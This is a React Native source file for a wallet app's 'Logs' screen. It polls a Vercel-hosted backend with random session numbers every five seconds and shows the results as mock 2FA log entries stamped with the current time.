import { StyleSheet, Text, View, Dimensions } from "react-native"
import React, { useEffect, useState } from "react"
import Topnav from "../components/TopNav/Topnav"
import axios from "axios"
const Logs = () => {
  const height = Dimensions.get("screen").height
  const width = Dimensions.get("screen").width
  const [Message, setMessage] = useState("")
  const [Data, setData] = useState("")
  const [date, setDate] = useState(new Date())

  const addMessage = async () => {
    try {
      var max32 = Math.pow(2, 32) - 1
      var session = Math.floor(Math.random() * max32);
      const { data } = await axios.put(`https://satochip-backend.vercel.app/put?msg=${session}`)
      setMessage(data)
      console.log(data, "Message Message")
    } catch (error) {
      console.error(error)
    }

  }

  const getData = async () => {
    try {
      const { data } = await axios.get(`https://satochip-backend.vercel.app/get?iv=${Message}`)
      setData(data)
      console.log(data, " data  data")
    } catch (error) {
      console.error(error)
    }

  }

  useEffect(() => {
    if (Message === "" && Data === "") {
      addMessage()
    }
    if (Message !== "" && Data === "") {
      getData()
    }

    const itervalId = setInterval(() => {
      getData()
      addMessage()
      setDate(new Date())
    }, 5000)
    return () => clearInterval(itervalId)
  }, [Message])

  return (
    <>
      <View>
        <Topnav />
      </View>
      <View style={{ backgroundColor: "#303030", height: height, width: width, alignItems: "center", justifyContent: "center" }}>
        <View style={{ height: height, width: width / 1.1 }}>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1, marginTop: 20,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>Contains the tx history...</Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>
            -----------------------------------------------
          </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>
            Added new factor on {date.toISOString()}
          </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>label: Debug-2FA </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>id_2FA: </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>
            {Message}
          </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>idreply_2FA: </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>
            {Data}
          </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>
            ---------------------------------------------------------
          </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>
            select new server: https://cosigner.electrum.org
          </Text>
          <Text style={{
            color: "white", fontWeight: "500",
            letterSpacing: 1,
            fontFamily: "Open Sans",
            lineHeight: 22,
          }}>
            ---------------------------------------------------------
          </Text>
        </View>
      </View>
    </>
  )
}

export default Logs

const styles = StyleSheet.create({})
